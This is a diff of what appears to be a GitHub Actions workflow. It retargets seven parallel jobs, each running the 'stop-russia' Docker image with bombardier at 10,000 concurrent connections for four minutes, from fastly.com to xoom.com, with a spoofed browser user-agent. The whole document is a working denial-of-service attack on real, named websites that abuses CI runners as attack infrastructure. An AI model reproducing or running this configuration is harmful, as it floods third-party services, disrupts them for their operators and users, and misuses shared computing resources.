@@ -26,7 +26,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: | 
-                  export url="https://www.fastly.com"
+                  export url="https://www.xoom.com"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 
   run-docker-command-2:
@@ -41,7 +41,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.fastly.com"
+                  export url="https://www.xoom.com"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 
   run-docker-command-3:
@@ -56,7 +56,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.fastly.com"
+                  export url="https://www.xoom.com"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
   run-docker-command-4:
     runs-on: ubuntu-latest
@@ -70,7 +70,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.fastly.com"
+                  export url="https://www.xoom.com"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
   run-docker-command-5:
     runs-on: ubuntu-latest
@@ -84,7 +84,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.fastly.com"
+                  export url="https://www.xoom.com"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 
   run-docker-command-6:
@@ -99,7 +99,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.fastly.com"
+                  export url="https://www.xoom.com"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 
   run-docker-command-7:
@@ -114,7 +114,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.fastly.com"
+                  export url="https://www.xoom.com"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 
   # run-docker-command-8:
